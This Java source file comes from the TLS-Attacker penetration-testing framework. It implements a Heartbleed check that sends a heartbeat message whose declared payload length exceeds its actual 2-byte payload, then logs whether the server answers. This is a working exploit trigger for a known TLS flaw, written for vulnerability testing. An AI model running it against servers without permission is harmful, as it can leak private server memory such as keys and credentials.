/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Juraj Somorovsky
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.tlsattacker.modifiablevariable.singlebyte.ModifiableByte;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.protocol.heartbeat.messages.HeartbeatMessage;
import de.rub.nds.tlsattacker.tls.protocol.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes the Heartbeat attack against a server and logs an error in case the
 * server responds with a valid heartbeat message.
 * 
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {

    public static Logger LOGGER = LogManager.getLogger(HeartbleedAttack.class);

    public HeartbleedAttack(HeartbleedCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	WorkflowTrace trace = tlsContext.getWorkflowTrace();

	ModifiableByte heartbeatMessageType = new ModifiableByte();
	ModifiableInteger payloadLength = new ModifiableInteger();
	payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
	ModifiableByteArray payload = new ModifiableByteArray();
	payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
	HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstProtocolMessage(ProtocolMessageType.HEARTBEAT);
	hb.setHeartbeatMessageType(heartbeatMessageType);
	hb.setPayload(payload);
	hb.setPayloadLength(payloadLength);

	workflowExecutor.executeWorkflow();

	HeartbeatMessage lastMessage = (HeartbeatMessage) trace.getProtocolMessages().get(
		trace.getProtocolMessages().size() - 1);
	if (lastMessage.getMessageIssuer() == ConnectionEnd.SERVER) {
	    LOGGER.error("The server responds with a heartbeat message, although the client heartbeat message contains an invalid ");
	} else {
	    LOGGER.info("The server does not respond with a heartbeat message, it is not vulnerable");
	}

	transportHandler.closeConnection();
    }
}
